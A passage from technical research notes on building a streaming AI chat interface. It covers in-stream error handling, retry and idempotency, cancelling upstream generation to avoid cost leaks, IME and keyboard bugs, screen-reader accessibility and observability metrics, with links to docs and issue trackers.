- **For us:** the cheap option is a `BroadcastChannel('chat')` that broadcasts `{threadId, runId, lastSeq}` and finished messages. A second tab viewing a streaming thread *resumes from the BFF log* instead of starting a new run. Use the Web Locks API (`navigator.locks`) to stop two tabs from sending into the same thread at once.

---

## 6. Error handling

### 6.1 Errors inside a 200 stream ⚠️ (we have `run.failed`; check the mapping)
- **Problem:** after streaming starts, the HTTP status is already 200. Overloads and other failures arrive as **in-stream error events**, so code that checks `response.status` misses them.
- **Sources:**
  - Anthropic docs: errors can occur after a 200 in SSE. https://docs.claude.com/en/api/errors
  - 529 `overloaded_error` arrives mid-stream as `event: error`; use a token-level stall timeout and backoff keyed to the error type: https://medium.com/@reshtei/anthropic-529-overloaded-error-what-it-means-and-how-to-handle-it-in-production-98f476b2e69e
  - OpenAI Responses events `error`, `response.failed`, `response.incomplete`, `response.refusal.delta/done`: https://developers.openai.com/api/reference/resources/responses/streaming-events
- **For us:** normalize into `run.failed{ code, message, retryable, retryAfterMs?, partial: boolean }` with codes such as `rate_limited | overloaded | context_length_exceeded | content_filter | upstream_error | network | timeout | cancelled`. When `partial` is true, **keep the streamed text** and show an inline "Response interrupted · Retry / Continue" bar instead of replacing the message with an error.

### 6.2 `response.incomplete` and refusals 🆕
- **Sources:**
  - `incomplete_details.reason ∈ {max_output_tokens, content_filter}`.
  - With reasoning models, `max_output_tokens` can be used up by reasoning, leaving **empty output_text**: https://community.openai.com/t/responses-api-empty-output-text-no-message-item-when-status-incomplete-due-to-max-output-tokens-reasoning-only-output/1373609
  - GPT-5 mini with web search runs out the same way: https://community.openai.com/t/gpt-5-mini-returns-incomplete-response-when-using-web-search-preview-due-to-max-output-tokens-limit/1359180
  - Moderation scores only arrive after the full output, so streamed partial content is unmoderated: https://developers.openai.com/api/docs/guides/streaming-responses
- **For us:**
  - Don't fold `incomplete` into `completed`. Emit `message.completed{ finish: 'incomplete', reason }`.
  - UI: "Answer cut off (length limit) · Continue" for `max_output_tokens`, and a neutral notice for `content_filter`.
  - Show refusals as a styled refusal, not as an error.
  - An empty assistant output with `incomplete` must not leave a blank bubble.

### 6.3 429 / Retry-After, retry policy, idempotency 🆕 (idempotency) ✅ (retry before first token)
- **Sources:**
  - OpenAI rate-limit headers (`x-ratelimit-remaining-*`, `x-ratelimit-reset-*`, `retry-after(-ms)`); official SDKs already retry, so don't stack retry loops: https://developers.openai.com/api/docs/guides/rate-limits
  - Double billing when a reconnect re-sends the prompt: tianpan keepalive post (§1.2).
- **For us:**
  - The BFF reads `retry-after-ms` / `Retry-After` and passes `retryAfterMs` in `run.failed`. The client waits at least that long, with jitter and a countdown in the UI.
  - Check whether the BFF's OpenAI SDK `maxRetries` plus our client retry multiply. Pick one layer.
  - **Idempotency:** the client sends `X-Request-Id` (stable across retries of the same user send). If the BFF already has a run for that ID, it *attaches* to it (replay from the log) instead of calling OpenAI again. This makes "retry before first token" safe even when the first attempt reached OpenAI but the client never saw a byte.
  - Retry only on network errors before the first byte, 408/429/5xx/529 and overloaded errors. Never retry 400 (context length, invalid tool sequence) or content_filter.

### 6.4 Context length exceeded 🆕
- **For us:** map the provider's `context_length_exceeded` to a specific UI ("Conversation too long — start new chat / summarize"). Better, prevent it in the BFF by counting tokens before the call and trimming or summarizing old turns. Don't auto-retry it.

### 6.5 Telling AbortError apart from real failures ✅⚠️
- **Source:** **vercel/ai #12878:** `generateText` silently swallowed AbortError in multi-step tool loops and returned normally with `finishReason: "unknown"`. https://github.com/vercel/ai/issues/12878
- **For us:** classify by `signal.aborted` first, *then* by error. The three cases are: user stop (status `aborted`, keep partial text, no error toast), watchdog timeout (`signal.reason = 'idle_timeout'`, which may resume), and navigation or unmount (silent). Use `controller.abort(reason)` with distinct reasons so the catch block can branch on them.

### 6.6 Cost leak: the client disconnects but the server keeps generating 🆕 (top priority)
- **Problem:** stopping the fetch closes the client connection. Unless the server propagates it, the upstream generation runs to completion and is billed. In multi-instance setups, a separate stop request can land on a different instance.
- **Sources:**
  - Ably, "Why Vercel AI SDK stop() doesn't cancel the stream": https://ably.com/vercel/why-vercel-ai-sdk-stop-doesnt-cancel-the-stream
  - Ably, "Stop vs disconnect": a server can't tell a user stop from a network drop from a tab close; a correct stop needs partial persistence, active-stream-id tracking, backend cancellation and safe cleanup. https://ably.com/blog/stop-vs-disconnect-canceling-ai-streaming
  - **vercel/ai #10719:** `stop()` "does not cancel". The maintainer could not reproduce it; the root cause was that the route didn't pass `abortSignal: request.signal` to `streamText`. https://github.com/vercel/ai/issues/10719
  - **vercel/ai #9707:** abort not detected server-side with `createUIMessageStream` on Nuxt/H3, "leading to unnecessary costs". https://github.com/vercel/ai/issues/9707
  - AI SDK stopping-streams docs (`abortSignal`, `onAbort`, `consumeStream`): https://ai-sdk.dev/docs/advanced/stopping-streams
- **For us:**
  - **Without resumable runs:** in the BFF, `req.on('close', () => upstreamController.abort())` and pass `signal` to the OpenAI SDK stream call. Persist the partial text in the abort handler.
  - **With resumable runs (§1.4):** *don't* abort on close. Add `POST /runs/:runId/cancel`, which aborts the upstream (or calls `POST /v1/responses/{id}/cancel` in background mode) and emits `run.cancelled` to any attached readers. The Stop button calls the cancel endpoint *and* aborts the local reader.
  - Use a server-side max run duration plus an "orphan reaper": cancel the upstream if no client has attached for N minutes.
  - On multiple instances, route cancels by `runId` through Redis pub/sub or sticky routing.
  - Log `tokens_generated_after_client_disconnect` to measure the leak.

---

## 7. Input UX

### 7.1 IME composition ✅ ⚠️ (Safari and Escape)
- **Sources:**
  - **assistant-ui #8199:** in **Safari**, the Enter that confirms an IME conversion sends the message, and **Escape used to cancel a conversion cancels the running reply** (`cancelOnEscape`) or stops read-aloud. https://github.com/assistant-ui/assistant-ui/issues/8199
  - **assistant-ui #8319 (open):** the same bug persists in the Lexical, Vue and Svelte composers. https://github.com/assistant-ui/assistant-ui/issues/8319
  - Safari sets `isComposing` to **false on the keydown of the confirming Enter**; use `keyCode === 229` as a fallback and track `compositionstart` / `compositionend`. https://dev.to/yukimi-inu/why-16-billion-east-asians-are-quietly-raging-at-your-enter-key-handler-1po0
  - Open WebUI #26172 (search modal ignores IME on Enter): https://github.com/open-webui/open-webui/issues/26172
  - Open WebUI #17141 (Cmd+Enter fails after IME): https://github.com/open-webui/open-webui/issues/17141
  - Open WebUI #18463 (focus jumps when using IME in multi-line edit): https://github.com/open-webui/open-webui/issues/18463
  - Cursor forum on the same bug: https://forum.cursor.com/t/critical-i18n-ime-enter-key-triggers-unintended-submission-in-chat-and-askquestion-completely-breaks-cjk-input-for-1-5-billion-users/154276
- **Checks for us:**
  - The guard should be `e.nativeEvent.isComposing || e.keyCode === 229 || composingRef.current || (Date.now() - lastCompositionEndAt < 50)`.
  - Apply the same guard to **Escape** (if Escape stops generation), ArrowUp (edit last message) and any global shortcut handlers.
  - Test the edit-message composer as well as the main one.
  - Test in Safari, both macOS and iOS, with the Korean 2-set IME.

### 7.2 Stop button, keyboard shortcuts, focus 🆕 (small)
- **Sources:**
  - **assistant-ui #8223:** a run starting elsewhere steals focus from another text field into the composer. https://github.com/assistant-ui/assistant-ui/issues/8223
  - **assistant-ui #8208:** closing the edit composer drops focus to `body`. https://github.com/assistant-ui/assistant-ui/issues/8208
- **For us:**
  - The Stop button replaces Send in the same position, so the click target is stable.
  - Escape stops the run only when the composer has focus and there is no composition.
  - Never move focus programmatically unless focus is already in the chat region.

### 7.3 Pasting large text 🆕
- **For us:** above some threshold (say 10k characters), turn the paste into an attachment chip ("Pasted text · 42 KB"), as ChatGPT and Claude do, instead of putting it in the textarea, which is slow with autosize. Show the token or character count, and warn before hitting the context limit.

### 7.4 Accessibility (aria-live) 🆕
- **Problem:** streaming text inside an `aria-live` region either re-announces everything on each token (with `aria-atomic=true`) or gets dropped by NVDA, JAWS and VoiceOver under load. Screen reader users also can't tell "generating" from "crashed".
- **Sources:**
  - azukiazusa: transcript as `role="log" aria-live="off"`; a separate visually hidden `role="status" aria-live="polite"` announces "Generating a response", "Response complete", "Cancelled" and "Could not generate"; screen-reader headings per message; never move focus. https://azukiazusa.dev/en/blog/accessible-streaming-chat-ui
  - tianpan, "AI accessibility streaming screen readers": https://tianpan.co/blog/2026/04/17/ai-accessibility-streaming-screen-readers
  - **Open WebUI #29211:** `role="log"` orphans the list items, and messages have no headings. https://github.com/open-webui/open-webui/issues/29211
- **For us:** drive the status region from reducer status transitions (`run.started → "Generating…"`, `message.completed → "Response complete"`, `run.failed → error text`). Clear `textContent`, then set it after about 100ms so repeated identical messages are still announced.

---

## 8. Observability 🆕

- **Sources:**
  - Sentry AI agent monitoring: `gen_ai.request` / `gen_ai.execute_tool` spans, `time_to_first_token`, token usage. https://docs.sentry.io/platforms/javascript/guides/connect/ai-agent-monitoring/
  - Sentry span-metrics examples, including an LLM client recording TTFT on the frontend: https://docs.sentry.io/platforms/javascript/tracing/span-metrics/examples
  - OpenTelemetry GenAI `gen_ai.server.time_to_first_token`: https://oneuptime.com/blog/post/2026-02-06-llm-observability-dashboard-opentelemetry-metrics/markdown
- **What to measure, client side, per `runId`:**
  - `t_submit` (click), `t_request_sent`, `t_first_byte` (any SSE bytes, including heartbeats), `t_run_started`, `t_first_token` (first `message.delta`), `t_completed`.
  - **TTFT = first_token − submit.** Also track **first-paint TTFT**, the rAF in which the first token actually renders.
  - Output tokens per second from `usage` in `message.completed`, divided by (completed − first_token).
  - Counters: retries before the first token, resumes, watchdog stalls (by phase), user aborts, abort phase (before or after the first token), `run.failed` by code, seq gaps, unknown events.
  - Long tasks during streaming (`PerformanceObserver('longtask')`) and dropped frames, to check rAF and markdown cost.
- **Correlation:**
  - The client sends `X-Request-Id`. The BFF puts it on its trace span, the OpenAI call, and the `run.started` payload.
  - Use Sentry `startSpan({ name: 'chat.run', attributes: { runId } })` that stays open for the stream, plus `Sentry.setMeasurement('ttft', ms)`.
  - Send the server-side `tokens_after_disconnect` metric (§6.6).
  - Don't send prompt or response content to Sentry by default (PII). Gate it behind a flag.

---

## 9. Quick checklist of things we ALREADY cover, with the specific check from the research

| Feature (have) | What to verify |
|---|---|
| fetch + custom SSE parser | Handles `\r\n`, multi-line `data:`, comment lines (`:`), events split across chunks, and multi-byte UTF-8 split across chunks (`TextDecoder` with `{stream:true}`). Release the reader in `finally`. |
| runId + seq | Use it for dedupe, gap detection and resume (§1.4). Drop events from a stale `runId` (§5.1). |
| Pure reducer | Ignores unknown events (CopilotKit #3323). Stores chunks instead of `+=` (vercel/ai #15670). Is keyed by thread. |
| AbortController | Use `abort(reason)` with distinct reasons. The BFF propagates abort upstream, or there is an explicit cancel endpoint (§6.6). |
| Retry before first token | Add an idempotency key (§6.3), honor `retry-after-ms`, and don't stack it with the SDK's own retries. |
| Idle watchdog | Resets on heartbeats; thresholds depend on phase (reasoning/tool); paused while `document.hidden`; on trigger, try resume before failing. |
| rAF batching | Batch the snapshot itself, not just the notification (vercel/ai #18547/#18525). Flush synchronously on terminal events. Consider `startTransition` (vercel/ai #21849). |
| Stick-to-bottom | Cover the edge cases in assistant-ui #8205/#8220/#8211, use-stick-to-bottom #32/#40, and iOS. |
| IME guard | Safari `keyCode 229` and timestamp fallback; guard Escape and other shortcuts too (assistant-ui #8199). |

---

## 10. Other references
- Ably, Vercel AI SDK stream error handling: https://ably.com/vercel/vercel-ai-sdk-stream-error-handling
- AI SDK error handling (errors are masked to "An error occurred" by default; `getErrorMessage` / `onError`): https://ai-sdk.dev/docs/troubleshooting/use-chat-an-error-occurred
- LangGraph `useStream`: `reconnectOnMount` stores the in-flight run ID in sessionStorage; join/rejoin lets a client disconnect without stopping the agent. https://docs.langchain.com/oss/javascript/langchain/frontend/join-rejoin
- OpenAI ChatKit (server-driven thread events, widgets, client tools): https://developers.openai.com/api/docs/guides/custom-chatkit
- Smashing Magazine, "Designing Stable Interfaces For Streaming Content" (layout shift): https://smashingmagazine.com/2026/05/designing-stable-interfaces-streaming-content/
- freeCodeCamp, building a reliable SSE client in TypeScript: https://freecodecamp.org/news/how-to-build-a-reliable-sse-client-in-typescript

**Research gaps:**
- I couldn't search the lobe-chat and LibreChat trackers through the GitHub API (it rejected the query). I could still open LibreChat #11460 directly.
- The Coder commit page returned 403, so that summary comes from search snippets.
- No directly relevant big-AGI or Chatbot UI issues turned up in the time I had. The patterns above are covered by the vercel/ai, assistant-ui, streamdown, Open WebUI and CopilotKit issues instead.
